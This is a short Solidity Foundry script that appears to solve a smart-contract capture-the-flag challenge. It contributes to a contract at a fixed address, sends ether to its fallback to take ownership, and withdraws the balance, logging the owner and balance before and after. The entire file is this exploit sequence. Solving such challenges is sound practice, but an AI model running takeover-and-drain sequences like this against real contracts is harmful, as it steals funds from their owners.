// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IProblem {
	function contribute() external payable;
	function withdraw() external;
	function owner() external view returns (address);
}

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
	address probAddr = 0x532323de74BAb864b7005D910E5bD8562D038b9b;
	console.log("probAddr code length : %d", probAddr.code.length);
	console.log("probAddr balance : %d", probAddr.balance);
	console.log("probAddr owner : %s", IProblem(probAddr).owner());
	IProblem(probAddr).contribute{value:10}();
	probAddr.call{value:1}("");
	IProblem(probAddr).withdraw();
	console.log("probAddr balance after poc : %d", probAddr.balance);
	console.log("probAddr owner after poc : %s", IProblem(probAddr).owner());
        vm.stopBroadcast();
    }
}
